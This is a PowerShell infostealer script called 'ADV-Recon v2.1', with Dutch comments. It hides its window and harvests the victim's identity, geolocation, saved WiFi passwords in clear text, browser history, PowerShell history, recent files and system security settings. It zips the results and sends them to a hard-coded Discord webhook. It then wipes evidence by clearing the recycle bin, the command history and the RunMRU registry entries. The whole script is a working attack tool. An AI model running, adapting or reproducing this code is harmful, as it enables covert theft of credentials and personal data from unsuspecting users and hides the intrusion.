# === CONFIGURATIE - VUL JE DISCORD WEBHOOK HIER IN ===
$dc = "https://discord.com/api/webhooks/1430461657829740706/T6oaosfibMgogVMfM5j2Mfg7MpanFy80UUjMwXi6NDmpyUl77ezJwGsWWxCCKB86yCsD"  # <-- JOUW DISCORD WEBHOOK URL HIER

# === DISCORD START NOTIFICATIE ===
if ($dc) {
    $hookurl = $dc
    $Body = @{
        'username' = "🚀 ADV-Recon v2.1"
        'content' = "🚀 **Recon GESTART** 
**PC**: `$env:COMPUTERNAME 
**User**: `$env:USERNAME 
**Tijd**: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue
}

# Hide window
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);

# Maak loot folder
$FolderName = "$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm)"
$ZIP = "$FolderName.zip"
New-Item -Path "$env:tmp\$FolderName" -ItemType Directory -Force | Out-Null

############################################################################################################################################################
# RECON FUNCTIONS
############################################################################################################################################################

function Get-fullName {
    try {
        return (Get-LocalUser -Name $env:USERNAME).FullName
    }
    catch {
        return $env:USERNAME
    }
}

function Get-email {
    try {
        return (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    }
    catch {
        return "No Email Detected"
    }
}

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') {
            return "Access Denied"
        } else {
            $pos = $GeoWatcher.Position.Location
            return "$($pos.Latitude),$($pos.Longitude)"
        }
    }
    catch {
        return "No Coordinates found"
    }
}

function Get-RegistryValue($key, $value) {  
    try { return (Get-ItemProperty $key $value -ErrorAction Stop).$value }
    catch { return "Unknown" }
}

############################################################################################################################################################
# DATA COLLECTION
############################################################################################################################################################

# Basic info
$fullName = Get-fullName
$email = Get-email
$GeoLocation = Get-GeoLocation

# Local users
$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String

# UAC
$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key "ConsentPromptBehaviorAdmin"
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key "PromptOnSecureDesktop"
if ($ConsentPromptBehaviorAdmin_Value -eq 0 -and $PromptOnSecureDesktop_Value -eq 0) { $UAC = "Never Notify" }
elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 0) { $UAC = "Notify (no dim)" }
elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 1) { $UAC = "Notify (default)" }
elseif ($ConsentPromptBehaviorAdmin_Value -eq 2 -and $PromptOnSecureDesktop_Value -eq 1) { $UAC = "Always Notify" }
else { $UAC = "Unknown" }

# LSASS
$lsass = Get-Process -Name "lsass" -ErrorAction SilentlyContinue
$lsass = if ($lsass.ProtectedProcess) { "Protected" } else { "Not Protected" }

# Startup
$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup")) -ErrorAction SilentlyContinue).Name -join "`n"

# Nearby WiFi
try {
    $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim() -join "`n"
} catch {
    $NearbyWifi = "No nearby wifi networks detected"
}

# Network info
try { $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing -TimeoutSec 5).Content.Trim() }
catch { $computerPubIP = "Error getting Public IP" }

try { $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String }
catch { $localIP = "Error getting local IP" }

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String

# RDP
$RDP = if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -ErrorAction SilentlyContinue).fDenyTSConnections -eq 0) { 
    "RDP is Enabled" 
} else { 
    "RDP is NOT enabled" 
}

# System info
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerName = $computerSystem.Name
$computerModel = $computerSystem.Model
$computerManufacturer = $computerSystem.Manufacturer
$computerBIOS = Get-CimInstance CIM_BIOSElement | Out-String
$computerOs = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String
$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed | Format-List | Out-String
$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List | Out-String
$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed | Format-Table | Out-String
$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion | Out-String

# Scheduled Tasks
$ScheduledTasks = Get-ScheduledTask | Select TaskName, State | Format-Table -AutoSize | Out-String

# Kerberos tickets
$klist = klist sessions 2>$null

# Recent files
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime | Format-Table | Out-String

# Drives
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}} | Format-Table | Out-String

# Processes
$process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath | Sort-Object ProcessName | Format-Table | Out-String -Width 250

# Listeners
$listener = Get-NetTCPConnection | select @{Name="Local";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="Remote";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, OwningProcess | Format-Table | Out-String -Width 250

# Services
$service = Get-WmiObject win32_service | select State, Name, DisplayName | Sort-Object State, Name | Format-Table | Out-String -Width 250

# Software
$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName } | Select DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 250

# WiFi profiles
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name = $_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass = $_.Matches.Groups[1].Value.Trim(); $_} | %{"$name : $pass"} | Out-String

# Tree userprofile
tree $Env:userprofile /a /f > "$env:tmp\$FolderName\tree.txt" 2>$null

# Powershell history
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$env:tmp\$FolderName\Powershell-History.txt" -ErrorAction SilentlyContinue

############################################################################################################################################################
# BROWSER DATA
############################################################################################################################################################

function Get-BrowserData {
    param([string]$Browser, [string]$DataType)
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    
    $Paths = @{
        "chrome_history" = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
        "chrome_bookmarks" = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
        "edge_history" = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
        "edge_bookmarks" = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
        "firefox_history" = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    }
    
    if ($Paths[$Browser + "_" + $DataType]) {
        $Path = $Paths[$Browser + "_" + $DataType]
        if (Test-Path $Path) {
            try {
                $urls = Get-Content -Path $Path -ErrorAction Stop | Select-String -AllMatches $regex | % { $_.Matches.Value } | Sort-Object -Unique
                return $urls | ForEach-Object { "$Browser/$DataType: $_" }
            } catch { return @() }
        }
    }
    return @()
}

$browserData = @()
$browserData += Get-BrowserData "chrome" "history"
$browserData += Get-BrowserData "chrome" "bookmarks"
$browserData += Get-BrowserData "edge" "history"
$browserData += Get-BrowserData "edge" "bookmarks"
$browserData += Get-BrowserData "firefox" "history"
$browserData | Out-File "$env:tmp\$FolderName\BrowserData.txt"

############################################################################################################################################################
# OUTPUT FILE
############################################################################################################################################################

$output = @"

############################################################################################################################################################
# ADV-Recon v2.1 - Results for $env:COMPUTERNAME
############################################################################################################################################################

**Full Name**: $fullName
**Email**: $email
**GeoLocation**: $GeoLocation

**Local Users**:
$luser

**UAC**: $UAC
**LSASS**: $lsass
**RDP**: $RDP

**Public IP**: $computerPubIP
**Local IPs**:
$localIP
**MAC**:
$MAC

**Computer Name**: $computerName
**Model**: $computerModel
**Manufacturer**: $computerManufacturer
**OS**: $computerOs
**CPU**: $computerCpu
**RAM**: $computerRamCapacity
**Video Card**: $videocard

**Startup Items**:
$StartUp

**WiFi Profiles**:
$wifiProfiles

**Nearby WiFi**:
$NearbyWifi

**Processes** (sample):
$($process.Split("`n")[0..20] -join "`n")

**Listeners**:
$listener

**Recent Files**:
$RecentFiles

**Drives**:
$Hdds

**Software** (sample):
$($software.Split("`n")[0..30] -join "`n")

---
**Full tree, history, browser data in separate files**
**Recon completed**: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
############################################################################################################################################################

"@

$output | Out-File "$env:tmp\$FolderName\computerData.txt"

############################################################################################################################################################
# ZIP & UPLOAD
############################################################################################################################################################

Compress-Archive -Path "$env:tmp\$FolderName" -DestinationPath "$env:tmp\$ZIP" -Force

# Discord upload
function Upload-Discord {
    param([string]$file, [string]$text = "")
    if ($dc -and $file -and (Test-Path $file)) {
        $uploadText = if ($text) { $text } else { "✅ **Recon VOLTOOID!** `$env:COMPUTERNAME - $env:USERNAME" }
        curl.exe -F "file1=@$file" -F "content=$uploadText" $dc -s
    }
}

if ($dc) { 
    Upload-Discord -file "$env:tmp\$ZIP" 
}

############################################################################################################################################################
# CLEANUP
############################################################################################################################################################

# Remove evidence
Remove-Item "$env:tmp\$FolderName*" -Recurse -Force -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f 2>$null

# Silent exit
exit
